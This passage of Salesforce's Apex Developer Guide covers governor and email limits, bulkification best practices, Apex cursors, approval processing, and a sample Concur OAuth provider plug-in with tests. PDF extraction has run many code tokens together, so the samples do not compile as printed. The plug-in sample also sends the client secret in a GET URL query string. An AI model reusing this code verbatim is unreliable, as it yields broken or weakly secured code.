The maximum number of rows that can be inserted, updated, or deleted, in a single, synchronous Apex test execution context, is
limited to 450,000. For example, an Apex class can have 45 methods that insert 10,000 rows each. If the limit is reached, you see this
error: YourrunallTestsis consumingtoo manyDB resources.
SOQL Query Performance
For best performance, use selective SOQL queries. This is especially important for queries inside triggers. See More Efficient SOQL
Queries.
Email Limits
Inbound Email Limits
Number of user licenses multiplied by
1,000; maximum 1,000,000
Email Services: Maximum Number of Email Messages Processed
(Includes limit for On-Demand Email-to-Case)
25 MB
1
Email Services: Maximum Size of Email Message (Body and Attachments)
25 MBOn-Demand Email-to-Case: Maximum Email Attachment Size
Number of user licenses multiplied by
1,000; maximum 1,000,000
On-Demand Email-to-Case: Maximum Number of Email Messages Processed
(Counts toward limit for Email Services)
1
 The maximum size of email messages for Email Services varies depending on character set and transfer encoding of the body parts.
The size of an email message includes the email headers, body, attachments, and encoding. As a result, an email with a 35-MB
attachment likely exceeds the 25-MB size limit for an email message after accounting for the headers, body, and encoding.
When defining email services, note the following:
•
An email service only processes messages it receives at one of its addresses.
352
Apex Transactions and Governor LimitsApex Developer Guide

•
Salesforce limits the total number of messages that all email services combined, including On-Demand Email-to-Case, can
process daily. Messages that exceed this limit are bounced, discarded, or queued for processing the next day, depending on
how you configure the failure response settings for each email service. Salesforce calculates the limit by multiplying the number
of user licenses by 1,000; maximum 1,000,000. For example, if you have 10 licenses, your org can process up to 10,000 email
messages a day.
•
Email service addresses that you create in your sandbox can’t be copied to your production org.
•
For each email service, you can tell Salesforce to send error email messages to a specified address instead of the sender's email
address.
•
Email services reject email messages and notify the sender if the email (combined body text, body HTML, and attachments)
exceeds approximately 25 MB (varies depending on language and character set).
Outbound Email: Limits for Single and Mass Email Sent Using Apex
Each licensed org can send single emails to a maximum of 5,000 external email addresses per day based on Greenwich Mean Time
(GMT). For orgs created before Spring ’19, the daily limit is enforced only for emails sent via Apex and Salesforce APIs except for REST
API. For orgs created in Spring ’19 and later, the daily limit is also enforced for email alerts, simple email actions, Send Email actions
in flows, and REST API. If one of the newly counted emails can’t be sent because your org has reached the limit, we notify you by
email and add an entry to the debug logs.Single emails sent using the email author or composer in Salesforce don't count toward
this limit.There’s no limit on sending single emails to contacts, leads, person accounts, and users in your org directly from account,
contact, lead, opportunity, case, campaign, or custom object pages.In Developer Edition orgs and orgs evaluating Salesforce during
a trial period, you can send to a maximum of 50 recipients per day, and each single email can have up to 15 recipients..
Keep these considerations in mind when sending emails:
•
When sending single emails, you can specify up to 150 recipients across the To, CC, and BCC fields in each
SingleEmailMessage. Each field is also limited to 4,000 bytes.
•
If you use SingleEmailMessage to email your org’s internal users, specifying the user’s ID in setTargetObjectId
means the email doesn’t count toward the daily limit. However, specifying internal users’ email addresses in setToAddresses
means the email does count toward the limit.
•
You can send mass email and list email to a maximum of 5,000 external email addresses per day per licensed Salesforce org. A
day is calculated based on Greenwich Mean Time (GMT).
•
The single email, mass email, and list email limits count duplicate email addresses. For example, if you have
johndoe@example.com in your email 10 times that counts as 10 against the limit.
•
API or Apex single emails can be sent to a maximum of 5,000 external email addresses per day.
•
You can send an unlimited amount of email through the UI to your org’s internal users, which include portal users.
•
You can send mass emails and list emails only to contacts, person accounts, leads, and your org’s internal users.
•
In Developer Edition orgs and orgs evaluating Salesforce during a trial period, you can send to no more than 10 external email
recipients per org per day using mass email and list email.
•
You can’t send mass email using a Visualforce email template.
Push Notification Limits
An org can send up to 20,000 iOS and 10,000 Android push notifications per hour (for example, 4:00 to 4:59 UTC).
Only deliverable notifications count toward this limit. For example, a notification is sent to 1,000 employees in your company, but 100
employees haven’t installed the mobile app yet. Only the notifications sent to the 900 employees who have installed the mobile app
count toward this limit.
Each test push notification that is generated through the Test Push Notification page is limited to a single recipient. Test push notifications
count toward an org’s hourly push notification limit.
353
Apex Transactions and Governor LimitsApex Developer Guide

When an org's hourly push notification limit is met, any additional notifications are still created for in-app display and retrieval via REST
API.
SEE ALSO:
Asynchronous Callout Limits
Platform Events Developer Guide
Set Up Governor Limit Email Warnings
You can specify users in your organization to receive an email notification when they invoke Apex code that surpasses 50% of allocated
governor limits. Only per-request limits are checked for sending email warnings; per-org limits like concurrent long-running requests
are not checked. These email notifications do not count against the daily single email limit.
1.Log in to Salesforce as an administrator user.
2.From Setup, enter Users in the QuickFind box, then select Users.
3.Click Edit next to the name of the user to receive the email notifications.
Note:  Only users with Author Apex permission can receive email notifications.
4.Select the SendApexWarningEmails option.
Note:  Only users with Author Apex permission can view and update this option.
5.Click Save.
Note:  These limits are currently checked for sending email warnings.
Total number of SOQL queries issued
Total number of records retrieved by SOQL queries
Total number of SOSL queries issued
Total number of DML statements issued
Total number of records processed as a result of DML statements, Approval.process, or database.emptyRecycleBin
Total heap size
Total number of callouts (HTTP requests or Web services calls) in a transaction
Total number of sendEmail methods allowed
Maximum number of methods with the future annotation allowed per Apex invocation
Maximum number of Apex jobs added to the queue with System.enqueueJob
Total number of records retrieved by Database.getQueryLocator
Total number of mobile Apex push calls
Running Apex within Governor Execution Limits
When you develop software in a multitenant cloud environment such as the Lightning platform, you don’t have to scale your code,
because the Lightning platform does it for you. Because resources are shared in a multitenant platform, the Apex runtime engine enforces
some limits to ensure that no one transaction monopolizes shared resources.
354
Apex Transactions and Governor LimitsApex Developer Guide

Your Apex code must execute within these predefined execution limits. If a governor limit is exceeded, a run-time exception that can’t
be handled is thrown. By following best practices in your code, you can avoid hitting these limits. Imagine you had to wash 100 T-shirts.
Would you wash them one by one—one per load of laundry, or would you group them in batches for just a few loads? The benefit of
coding in the cloud is that you learn how to write more efficient code and waste fewer resources.
The governor execution limits are per transaction. For example, one transaction can issue up to 100 SOQL queries and up to 150 DML
statements. There are some other limits that aren’t transaction bound, such as the number of batch jobs that can be queued or active
at one time.
The following are some best practices for writing code that doesn’t exceed certain governor limits.
Bulkifying DML Calls
Making DML calls on lists of sObjects instead of each individual sObject makes it less likely to reach the DML statements limit. The
following is an example that doesn’t bulkify DML operations, and the next example shows the recommended way of calling DML
statements.
Example: DML calls on single sObjects
The for loop iterates over line items contained in the liList List variable. For each line item, it sets a new value for the Description__c
field and then updates the line item. If the list contains more than 150 items, the 151st update call returns a run-time exception for
exceeding the DML statement limit of 150. How do we fix this? Check the second example for a simple solution.
for(Line_Item__cli : liList){
if (li.Units_Sold__c> 10) {
li.Description__c= 'Newdescription';
}
// Not a goodpracticesincegovernorlimitsmightbe hit.
updateli;
}
Recommended Alternative: DML calls on sObject lists
This enhanced version of the DML call performs the update on an entire list that contains the updated line items. It starts by creating a
new list and then, inside the loop, adds every update line item to the new list. It then performs a bulk update on the new list.
List<Line_Item__c>updatedList= new List<Line_Item__c>();
for(Line_Item__cli : liList){
if (li.Units_Sold__c> 10) {
li.Description__c= 'Newdescription';
updatedList.add(li);
}
}
// OnceDML callfor the entirelistof lineitems
updateupdatedList;
More Efficient SOQL Queries
Placing SOQL queries inside for loop blocks isn’t a good practice because the SOQL query executes once for each iteration and may
surpass the 100 SOQL queries limit per transaction. The following is an example that runs a SOQL query for every item in Trigger.new,
which isn’t efficient. An alternative example is given with a modified query that retrieves child items using only one SOQL query.
Example: Inefficient querying of child items
355
Apex Transactions and Governor LimitsApex Developer Guide

The for loop in this example iterates over all invoice statements that are in Trigger.new. The SOQL query performed inside the
loop retrieves the child line items of each invoice statement. If more than 100 invoice statements were inserted or updated, and thus
contained in Trigger.new, this results in a run-time exception because of reaching the SOQL limit. The second example solves this
problem by creating another SOQL query that can be called only once.
triggerLimitExampleon Invoice_Statement__c(beforeinsert, beforeupdate) {
for(Invoice_Statement__cinv : Trigger.new) {
// ThisSOQLqueryexecutesoncefor eachitemin Trigger.new.
// It getsthe lineitemsfor eachinvoicestatement.
List<Line_Item__c>liList= [SELECTId,Units_Sold__c,Merchandise__c
FROMLine_Item__c
WHEREInvoice_Statement__c= :inv.Id];
for(Line_Item__cli : liList){
// Do something
}
}
}
Recommended Alternative: Querying of child items with one SOQL query
This example bypasses the problem of having the SOQL query called for each item. It has a modified SOQL query that retrieves all invoice
statements that are part of Trigger.new and also gets their line items through the nested query. In this way, only one SOQL query
is performed and we’re still within our limits.
triggerEnhancedLimitExampleon Invoice_Statement__c(beforeinsert, beforeupdate) {
// PerformSOQLqueryoutsideof the for loop.
// ThisSOQLqueryrunsoncefor all itemsin Trigger.new.
List<Invoice_Statement__c>invoicesWithLineItems=
[SELECTId,Description__c,(SELECTId,Units_Sold__c,Merchandise__cfromLine_Items__r)
FROMInvoice_Statement__cWHEREId IN :Trigger.newMap.KeySet()];
for(Invoice_Statement__cinv : invoicesWithLineItems){
for(Line_Item__cli : inv.Line_Items__r){
// Do something
}
}
}
SOQL For Loops
Use SOQL for loops to operate on records in batches of 200. This helps avoid the heap size limit of 6 MB. Note that this limit is for code
running synchronously and it is higher for asynchronous code execution.
Example: Query without a for loop
The following is an example of a SOQL query that retrieves all merchandise items and stores them in a List variable. If the returned
merchandise items are large in size and a large number of them was returned, the heap size limit might be hit.
List<Merchandise__c>ml = [SELECTId,NameFROMMerchandise__c];
Recommended Alternative: Query within a for loop
356
Apex Transactions and Governor LimitsApex Developer Guide

To prevent this from happening, this second version uses a SOQL for loop, which iterates over the returned results in batches of 200
records. This reduces the size of the ml list variable which now holds 200 items instead of all items in the query results, and gets recreated
for every batch.
for (List<Merchandise__c>ml : [SELECTId,NameFROMMerchandise__c]){
// Do something.
}
Using Salesforce Features with Apex
Many features of the Salesforce user interface are exposed in Apex so that you can access them programmatically in the Lightning
Platform. For example, you can write Apex code to post to a Chatter feed, or use the approval methods to submit and approve process
requests.
Actions
Create quick actions, and add them to your Salesforce Classic home page, to the Chatter tab, to Chatter groups, and to record detail
pages. Choose from standard quick actions, such as create and update actions, or create custom actions based on your company’s
needs.
Apex Cursors (Beta)
Use Apex cursors to break up the processing of a SOQL query result into pieces that can be processed within the bounds of a single
transaction. Cursors provide you with the ability to work with large query result sets, while not actually returning the entire result
set. You can traverse a query result in parts, with the flexibility to navigate forward and back in the result set. Package developers
and advanced developers can use cursors effectively to work with high-volume and high-resource processing jobs. Cursors combined
with chained queueable Apex jobs are a powerful alternative to batch Apex and address some of batch Apex’s limitations.
Approval Processing
An approval process automates how records are approved in Salesforce. An approval process specifies each step of approval, including
from whom to request approval and what to do at each point of the process.
Authentication
Salesforce provides various ways to authenticate users. Build a combination of authentication methods to fit the needs of your org
and your users’ use patterns.
Chatter Answers and Ideas
In Chatter Answers and Ideas, use zones to organize ideas and answers into groups. Each zone can have its own focus, with unique
ideas and answers topics to match that focus.
Use Cases for the CommercePayments Namespace
Review walkthroughs, use cases, and reference material for the CommercePayments platform.
Connect in Apex
Use Connect in Apex to develop custom experiences in Salesforce. Connect in Apex provides programmatic access to B2B Commerce,
CMS managed content, Experience Cloud sites, topics, and more. Create Apex pages that display Chatter feeds, post feed items with
mentions and topics, and update user and group photos. Create triggers that update Chatter feeds.
Moderate Chatter Private Messages with Triggers
Write a trigger for ChatterMessage to automate the moderation of private messages in an org or Experience Cloud site. Use triggers
to ensure that messages conform to your company’s messaging policies and don’t contain blocklisted words.
Data Cloud In Apex
You can use Apex with Data Cloud objects, with constraints and considerations that are detailed in this topic . Further, you can mock
SOQL query responses for Data Cloud data model objects (DMOs) in Apex testing by using SOQL stub methods and a test class.
357
Using Salesforce Features with ApexApex Developer Guide

DataWeave in Apex
DataWeave in Apex uses the Mulesoft DataWeave library to read and parse data from one format, transform it, and export it in a
different format. You can create DataWeave scripts as metadata and invoke them directly from Apex. Like Apex, DataWeave scripts
are run within Salesforce application servers, enforcing the same heap and CPU limits on the executing code.
Moderate Feed Items with Triggers
Write a trigger for FeedItem to automate the moderation of posts in an org or Experience Cloud site. Use triggers to ensure that
posts conform to your company’s communication policies and don’t contain unwanted words or phrases.
Experience Cloud Sites
Experience Cloud sites are branded spaces for your employees, customers, and partners to connect. You can customize and create
sites to meet your business needs, then transition seamlessly between them.
Email
You can use Apex to work with inbound and outbound email.
External Services
External Services connect your Salesforce org to a service outside of Salesforce, such as an employee banking service. After you
register the external service, you can call it natively in your Apex code. Objects and operations defined in the external service's
registered API specification become Apex classes and methods in the ExternalService namespace. The registered service's
schema types map to Apex types, and are strongly typed, making the Apex compiler do the heavy lifting for you. For example, you
can make a type safe callout to an external service from Apex without needing to use the Http class or perform transforms on
JSON strings.
Flows
Flow Builder lets admins build applications, known as flows, that automate a business process by collecting data and doing something
in your Salesforce org or an external system.
Formula Evaluation in Apex
Formula evaluation in Apex helps avoid unnecessary DML statements to recalculate formula field values and evaluate dynamic
formula expressions. Dynamic formulas in Apex support SObjects and Apex objects as context objects. The context type that
corresponds to the Apex class used in the FormulaBuilder.withType() method must be a global, user-defined Apex
class. Any fields, properties, or methods that the formula references must also be global.
Metadata
Salesforce uses metadata types and components to represent org configuration and customization. Metadata is used for org settings
that admins control, or configuration information applied by installed apps and packages.
Permission Set Groups
To provide Apex test coverage for permission set groups, write tests using the calculatePermissionSetGroup() method
in the System.Test class.
Platform Cache
The Lightning Platform Cache layer provides faster performance and better reliability when caching Salesforce session and org data.
Specify what to cache and for how long without using custom objects and settings or overloading a Visualforce view state. Platform
Cache improves performance by distributing cache space so that some applications or operations don’t steal capacity from others.
Salesforce Knowledge
Salesforce Knowledge is a knowledge base where users can easily create and manage content, known as articles, and quickly find
and view the articles they need.
Salesforce Files
Use Apex to customize the behavior of Salesforce Files.
358
Using Salesforce Features with ApexApex Developer Guide

Salesforce Connect
Apex code can access external object data via any Salesforce Connect adapter. Use the Apex Connector Framework to develop a
custom adapter for Salesforce Connect. The custom adapter can retrieve data from external systems and synthesize data locally.
Salesforce Connect represents that data in Salesforce external objects, enabling users and the Lightning Platform to seamlessly
interact with data that’s stored outside the Salesforce org.
Salesforce Reports and Dashboards API via Apex
The Salesforce Reports and Dashboards API via Apex gives you programmatic access to your report data as defined in the report
builder.
Salesforce Sites
Salesforce Sites lets you build custom pages and Web applications by inheriting Lightning Platform capabilities including analytics,
workflow and approvals, and programmable logic.
Support Classes
Support classes allow you to interact with records commonly used by support centers, such as business hours and cases.
Territory Management 2.0
With trigger support for the Territory2 and UserTerritory2Association standard objects, you can automate actions and processes
related to changes in these territory management records.
Actions
Create quick actions, and add them to your Salesforce Classic home page, to the Chatter tab, to Chatter groups, and to record detail
pages. Choose from standard quick actions, such as create and update actions, or create custom actions based on your company’s needs.
•
Create actions let users create records—like New Contact, New Opportunity, and New Lead.
•
Custom actions invoke Lightning components, flows, Visualforce pages, or canvas apps with functionality that you define.Use a
Visualforce page, Lightning component, or a canvas app to create global custom actions for tasks that don’t require users to use
records that have a relationship to a specific object. Object-specific custom actions invoke Lightning components, flows, Visualforce
pages, or canvas apps that let users interact with or create records that have a relationship to an object record.
For create, Log a Call, and custom actions, you can create either object-specific actions or global actions. Update actions must be
object-specific.
For more information on actions, see the online help.
SEE ALSO:
Apex Reference Guide: QuickAction Class
Apex Reference Guide: QuickActionRequest Class
Apex Reference Guide: QuickActionResult Class
Apex Reference Guide: DescribeQuickActionResult Class
Apex Reference Guide: DescribeQuickActionDefaultValue Class
Apex Reference Guide: DescribeLayoutSection Class
Apex Reference Guide: DescribeLayoutRow Class
Apex Reference Guide: DescribeLayoutItem Class
Apex Reference Guide: DescribeLayoutComponent Class
Apex Reference Guide: DescribeAvailableQuickActionResult Class
359
Using Salesforce Features with ApexApex Developer Guide

Apex Cursors (Beta)
Use Apex cursors to break up the processing of a SOQL query result into pieces that can be processed within the bounds of a single
transaction. Cursors provide you with the ability to work with large query result sets, while not actually returning the entire result set.
You can traverse a query result in parts, with the flexibility to navigate forward and back in the result set. Package developers and advanced
developers can use cursors effectively to work with high-volume and high-resource processing jobs. Cursors combined with chained
queueable Apex jobs are a powerful alternative to batch Apex and address some of batch Apex’s limitations.
Note:  This feature is a Beta Service. Customer may opt to try such Beta Service in its sole discretion. Any use of the Beta Service
is subject to the applicable Beta Services Terms provided at Agreements and Terms. You can provide feedback and suggestions
for the feature in the Trailblazer Community.
Apex cursors are stateless and generate results from the offset position that is specified in the Cursor.fetch(integer
position,integercount) method. You must track the offsets or positions of the results within your particular processing
scenario.
A cursor is created when a SOQL query is executed on a Database.getCursor() or Database.getCursorWithBinds()
call. When a Cursor.fetch(integerposition,integercount) method is invoked with an offset position and the
count of records to fetch, the corresponding rows are returned from the cursor. The maximum number of rows per cursor is 50 million,
regardless of the operation being synchronous or asynchronous. To get the number of cursor rows returned from the SOQL query, use
Cursor.getNumRecords().
Apex cursors throw these new System exceptions: System.FatalCursorException and
System.TransientCursorException. Transactions that fail with System.TransientCursorException can be
retried.
Apex cursors have the same expiration limits as API Query cursors. See API Query Cursor Limits.
To get Apex cursor limits, use these new methods in the Limits class.
•
Limits.getApexCursorRows() and its upper bound Limits.getLimitApexCursorRows() method
•
Limits.getFetchCallsOnApexCursor() and its upper bound
Limits.getLimitFetchCallsOnApexCursor() method
Apex Cursor Example
publicclassQueryChunkingQueuableimplementsQueueable{
privateDatabase.Cursorlocator;
privateintegerposition;
publicQueryChunkingQueuable(){
locator= Database.getCursor
('SELECTId FROMContactWHERELastActivityDate= LAST_N_DAYS:400');
position= 0;
}
publicvoidexecute(QueueableContextctx){
List<Contact>scope= locator.fetch(position,200);
position+= scope.size();
// do something,likearchiveor deletethe scopelistrecords
if(position< locator.getNumRecords()) {
// processthe nextchunk
System.enqueueJob(this);
}
360
Using Salesforce Features with ApexApex Developer Guide

}
}
Approval Processing
An approval process automates how records are approved in Salesforce. An approval process specifies each step of approval, including
from whom to request approval and what to do at each point of the process.
•
Use the Apex process classes to create approval requests and process the results of those requests:
–
ProcessRequest Class
–
ProcessResult Class
–
ProcessSubmitRequest Class
–
ProcessWorkItemRequest Class
•
Use the Approval.process method to submit an approval request and approve or reject existing approval requests. For more
information, see Approval Class.
Note:  The process method counts against the DML limits for your organization. See Execution Governors and Limits.
For more information about approval processes, see “Set Up an Approval Process” in the Salesforce online help.
Apex Approval Processing Example
Apex Approval Processing Example
The following sample code initially submits a record for approval, then approves the request. This example assumes that a pre-existing
approval process on Account exists and is valid for the Account record created.
publicclassTestApproval{
voidsubmitAndProcessApprovalRequest(){
// Insertan account
Accounta = new Account(Name='Test',annualRevenue=100.0);
inserta;
Useruser1= [SELECTId FROMUserWHEREAlias='SomeStandardUser'];
// Createan approvalrequestfor the account
Approval.ProcessSubmitRequestreq1=
new Approval.ProcessSubmitRequest();
req1.setComments('Submittingrequestfor approval.');
req1.setObjectId(a.id);
// Submiton behalfof a specificsubmitter
req1.setSubmitterId(user1.Id);
// Submitthe recordto the existingprocessnamedPTO_Request_Process
req1.setProcessDefinitionNameOrId('PTO_Request_Process');
// Skipthe criteriaevaluationfor the specifiedprocess
req1.setSkipEntryCriteria(true);
// Submitthe approvalrequestfor the account
361
Using Salesforce Features with ApexApex Developer Guide

Approval.ProcessResultresult= Approval.process(req1);
// Verifythe result
System.assert(result.isSuccess());
System.assertEquals(
'Pending', result.getInstanceStatus(),
'InstanceStatus'+result.getInstanceStatus());
// Approvethe submittedrequest
// First,get the ID of the newlycreateditem
List<Id>newWorkItemIds= result.getNewWorkitemIds();
// Instantiatethe new ProcessWorkitemRequestobjectand populateit
Approval.ProcessWorkitemRequestreq2=
new Approval.ProcessWorkitemRequest();
req2.setComments('Approvingrequest.');
req2.setAction('Approve');
req2.setNextApproverIds(new Id[]{UserInfo.getUserId()});
// Use the ID fromthe newlycreateditemto specifythe itemto be worked
req2.setWorkitemId(newWorkItemIds.get(0));
// Submitthe requestfor approval
Approval.ProcessResultresult2=  Approval.process(req2);
// Verifythe results
System.assert(result2.isSuccess(),'ResultStatus:'+result2.isSuccess());
System.assertEquals(
'Approved', result2.getInstanceStatus(),
'InstanceStatus'+result2.getInstanceStatus());
}
}
Authentication
Salesforce provides various ways to authenticate users. Build a combination of authentication methods to fit the needs of your org and
your users’ use patterns.
Create a Custom Authentication Provider Plug-in
You can use Apex to create a custom OAuth-based authentication provider plug-in for single sign-on (SSO) to Salesforce.
OAuth 2.0 Token Exchange Handler Examples
Sometimes you want to integrate Salesforce into a complex system where you have a primary app, a central identity provider, and
multiple other apps and microservices. In this model, users log in to the primary app via the identity provider and access data provided
by the other apps and microservices. To fit Salesforce into this model as one of the apps providing data, use the OAuth 2.0 token
exchange flow, which implements an Apex token exchange handler.
Create a Custom Authentication Provider Plug-in
You can use Apex to create a custom OAuth-based authentication provider plug-in for single sign-on (SSO) to Salesforce.
362
Using Salesforce Features with ApexApex Developer Guide

Out of the box, Salesforce supports several external authentication providers for single sign-on, including Facebook, Google, LinkedIn,
and service providers that implement the OpenID Connect protocol. By creating a plug-in with Apex, you can add your own OAuth-based
authentication provider. Your users can then use the SSO credentials they already use for non-Salesforce applications with your Salesforce
orgs.
Before you create your Apex class, you create a custom metadata type record for your authentication provider. For details, see Create a
Custom External Authentication Provider.
Sample Classes
This example extends the abstract class Auth.AuthProviderPluginClass to configure an external authentication provider
called Concur. Build the sample classes and sample test classes in the following order.
1.Concur
2.ConcurTestStaticVar
3.MockHttpResponseGenerator
4.ConcurTestClass
globalclassConcurextendsAuth.AuthProviderPluginClass{
publicStringredirectUrl;// use thisURL for the endpointthatthe
authenticationprovidercallsbackto for configuration
privateStringkey;
privateStringsecret;
privateStringauthUrl;// applicationredirectionto the Concurwebsite
for authenticationand authorization
privateStringaccessTokenUrl;// uri to get the new accesstokenfrom
concurusingthe GET verb
privateStringcustomMetadataTypeApiName;// api namefor the custommetadata
typecreatedfor thisauthprovider
privateStringuserAPIUrl;// api url to accessthe userin concur
privateStringuserAPIVersionUrl;// versionof the userapi url to access
datafromconcur
globalStringgetCustomMetadataType(){
returncustomMetadataTypeApiName;
}
globalPageReferenceinitiate(Map<string,string>authProviderConfiguration,
StringstateToPropagate){
authUrl= authProviderConfiguration.get('Auth_Url__c');
key = authProviderConfiguration.get('Key__c');
//Herethe developercan buildup a requestof somesort
//Ultimatelythey’llreturna URL wherewe willredirectthe user
Stringurl = authUrl+ '?client_id='+ key
+'&scope=USER,EXPRPT,LIST&redirect_uri='+ redirectUrl+ '&state='+ stateToPropagate;
returnnew PageReference(url);
}
globalAuth.AuthProviderTokenResponsehandleCallback(Map<string,string>
authProviderConfiguration,Auth.AuthProviderCallbackStatestate) {
//Here,the developerwillget the callbackwithactualprotocol.
//Theirresponsibilityis to returna new objectcalledAuthProviderToken
363
Using Salesforce Features with ApexApex Developer Guide

//Thiswillcontainan optionalaccessTokenand refreshToken
key = authProviderConfiguration.get('Key__c');
secret= authProviderConfiguration.get('Secret__c');
accessTokenUrl= authProviderConfiguration.get('Access_Token_Url__c');
Map<String,String> queryParams= state.queryParameters;
Stringcode= queryParams.get('code');
StringsfdcState= queryParams.get('state');
HttpRequestreq = new HttpRequest();
Stringurl = accessTokenUrl+'?code='+ code+ '&client_id='+ key +
'&client_secret='+ secret;
req.setEndpoint(url);
req.setHeader('Content-Type','application/xml');
req.setMethod('GET');
Httphttp= new Http();
HTTPResponseres = http.send(req);
StringresponseBody= res.getBody();
StringaccessToken= getTokenValueFromResponse(responseBody,
'AccessToken', null);
//Parseaccesstokenvalue
StringrefreshToken= getTokenValueFromResponse(responseBody,
'RefreshToken', null);
//Parserefreshtokenvalue
returnnew Auth.AuthProviderTokenResponse('Concur', accessToken,
'refreshToken', sfdcState);
//don’thard-codethe refreshtokenvalue!
}
globalAuth.UserDatagetUserInfo(Map<string,string>
authProviderConfiguration,Auth.AuthProviderTokenResponseresponse){
//Herethe developeris responsiblefor constructingan Auth.UserData
object
Stringtoken= response.oauthToken;
HttpRequestreq = new HttpRequest();
userAPIUrl= authProviderConfiguration.get('API_User_Url__c');
userAPIVersionUrl=
authProviderConfiguration.get('API_User_Version_Url__c');
req.setHeader('Authorization', 'OAuth' + token);
req.setEndpoint(userAPIUrl);
req.setHeader('Content-Type','application/xml');
req.setMethod('GET');
Httphttp= new Http();
HTTPResponseres = http.send(req);
StringresponseBody= res.getBody();
Stringid = getTokenValueFromResponse(responseBody,
'LoginId',userAPIVersionUrl);
Stringfname= getTokenValueFromResponse(responseBody,'FirstName',
364
Using Salesforce Features with ApexApex Developer Guide

userAPIVersionUrl);
Stringlname= getTokenValueFromResponse(responseBody,'LastName',
userAPIVersionUrl);
Stringflname= fname+ ' ' + lname;
Stringuname= getTokenValueFromResponse(responseBody,'EmailAddress',
userAPIVersionUrl);
Stringlocale= getTokenValueFromResponse(responseBody,'LocaleName',
userAPIVersionUrl);
Map<String,String> provMap= new Map<String,String>();
provMap.put('what1', 'noidea1');
provMap.put('what2', 'noidea2');
returnnew Auth.UserData(id,fname,lname,flname,uname,
'what', locale,null, 'Concur', null, provMap);
}
privateStringgetTokenValueFromResponse(Stringresponse,Stringtoken,
Stringns) {
Dom.Documentdocx= new Dom.Document();
docx.load(response);
Stringret = null;
dom.XmlNodexroot= docx.getrootelement();
if(xroot!= null){
ret = xroot.getChildElement(token,ns).getText();
}
returnret;
}
}
Sample Test Classes
The following example contains test classes for the Concur class.
@IsTest
publicclassConcurTestClass{
privatestaticfinalStringOAUTH_TOKEN= 'testToken';
privatestaticfinalStringSTATE= 'mocktestState';
privatestaticfinalStringREFRESH_TOKEN= 'refreshToken';
privatestaticfinalStringLOGIN_ID= 'testLoginId';
privatestaticfinalStringUSERNAME= 'testUsername';
privatestaticfinalStringFIRST_NAME= 'testFirstName';
privatestaticfinalStringLAST_NAME= 'testLastName';
privatestaticfinalStringEMAIL_ADDRESS= 'testEmailAddress';
privatestaticfinalStringLOCALE_NAME= 'testLocalName';
privatestaticfinalStringFULL_NAME= FIRST_NAME+ ' ' + LAST_NAME;
privatestaticfinalStringPROVIDER= 'Concur';
privatestaticfinalStringREDIRECT_URL=
'http://localhost/services/authcallback/orgId/Concur';
privatestaticfinalStringKEY = 'testKey';
privatestaticfinalStringSECRET= 'testSecret';
privatestaticfinalStringSTATE_TO_PROPOGATE= 'testState';
privatestaticfinalStringACCESS_TOKEN_URL= 'http://www.dummyhost.com/accessTokenUri';
365
Using Salesforce Features with ApexApex Developer Guide

privatestaticfinalStringAPI_USER_VERSION_URL= 'http://www.dummyhost.com/user/20/1';
privatestaticfinalStringAUTH_URL= 'http://www.dummy.com/authurl';
privatestaticfinalStringAPI_USER_URL= 'www.concursolutions.com/user/api';
// in the realworldscenario, the key and valuewouldbe readfromthe (customfields
in) custommetadatatyperecord
privatestaticMap<String,String> setupAuthProviderConfig() {
Map<String,String> authProviderConfiguration= new Map<String,String>();
authProviderConfiguration.put('Key__c', KEY);
authProviderConfiguration.put('Auth_Url__c', AUTH_URL);
authProviderConfiguration.put('Secret__c', SECRET);
authProviderConfiguration.put('Access_Token_Url__c', ACCESS_TOKEN_URL);
authProviderConfiguration.put('API_User_Url__c',API_USER_URL);
authProviderConfiguration.put('API_User_Version_Url__c',API_USER_VERSION_URL);
authProviderConfiguration.put('Redirect_Url__c',REDIRECT_URL);
returnauthProviderConfiguration;
}
statictestMethodvoidtestInitiateMethod(){
StringstateToPropogate= 'mocktestState';
Map<String,String> authProviderConfiguration= setupAuthProviderConfig();
ConcurconcurCls= new Concur();
concurCls.redirectUrl= authProviderConfiguration.get('Redirect_Url__c');
PageReferenceexpectedUrl=  new
PageReference(authProviderConfiguration.get('Auth_Url__c') + '?client_id='+
authProviderConfiguration.get('Key__c')
+'&scope=USER,EXPRPT,LIST&redirect_uri='+
authProviderConfiguration.get('Redirect_Url__c') + '&state='+
STATE_TO_PROPOGATE);
PageReferenceactualUrl= concurCls.initiate(authProviderConfiguration,
STATE_TO_PROPOGATE);
System.assertEquals(expectedUrl.getUrl(),actualUrl.getUrl());
}
statictestMethodvoidtestHandleCallback(){
Map<String,String> authProviderConfiguration= setupAuthProviderConfig();
ConcurconcurCls= new Concur();
concurCls.redirectUrl= authProviderConfiguration.get('Redirect_Url_c');
Test.setMock(HttpCalloutMock.class, new ConcurMockHttpResponseGenerator());
Map<String,String> queryParams= new Map<String,String>();
queryParams.put('code','code');
queryParams.put('state',authProviderConfiguration.get('State_c'));
Auth.AuthProviderCallbackStatecbState= new
Auth.AuthProviderCallbackState(null,null,queryParams);
Auth.AuthProviderTokenResponseactualAuthProvResponse=
concurCls.handleCallback(authProviderConfiguration,cbState);
366
Using Salesforce Features with ApexApex Developer Guide

Auth.AuthProviderTokenResponseexpectedAuthProvResponse= new
Auth.AuthProviderTokenResponse('Concur', OAUTH_TOKEN,REFRESH_TOKEN,null);
System.assertEquals(expectedAuthProvResponse.provider,
actualAuthProvResponse.provider);
System.assertEquals(expectedAuthProvResponse.oauthToken,
actualAuthProvResponse.oauthToken);
System.assertEquals(expectedAuthProvResponse.oauthSecretOrRefreshToken,
actualAuthProvResponse.oauthSecretOrRefreshToken);
System.assertEquals(expectedAuthProvResponse.state,actualAuthProvResponse.state);
}
statictestMethodvoidtestGetUserInfo(){
Map<String,String> authProviderConfiguration= setupAuthProviderConfig();
ConcurconcurCls= new Concur();
Test.setMock(HttpCalloutMock.class, new ConcurMockHttpResponseGenerator());
Auth.AuthProviderTokenResponseresponse= new
Auth.AuthProviderTokenResponse(PROVIDER,OAUTH_TOKEN,'sampleOauthSecret', STATE);
Auth.UserDataactualUserData= concurCls.getUserInfo(authProviderConfiguration,
response);
Map<String,String> provMap= new Map<String,String>();
provMap.put('key1', 'value1');
provMap.put('key2', 'value2');
Auth.UserDataexpectedUserData= new Auth.UserData(LOGIN_ID,FIRST_NAME,
LAST_NAME,FULL_NAME,EMAIL_ADDRESS,
null, LOCALE_NAME,null, PROVIDER,null, provMap);
System.assertNotEquals(expectedUserData,null);
System.assertEquals(expectedUserData.firstName,actualUserData.firstName);
System.assertEquals(expectedUserData.lastName,actualUserData.lastName);
System.assertEquals(expectedUserData.fullName,actualUserData.fullName);
